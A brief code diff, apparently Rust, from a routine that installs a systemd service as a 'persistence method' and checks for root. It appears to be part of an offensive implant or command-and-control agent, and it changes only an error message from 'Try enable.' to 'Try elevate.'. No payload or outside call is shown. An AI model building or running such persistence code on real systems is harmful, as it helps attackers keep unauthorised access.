@@ -245,7 +245,7 @@ WantedBy=multi-user.target"
                         return Ok("Could not copy service file".to_string());
                     }
                 } else {
-                    return Ok("Need to be root first. Try enable.".to_string());
+                    return Ok("Need to be root first. Try elevate.".to_string());
                 }
             }, 
             _         => Ok("Unknown persistence method!".to_string())
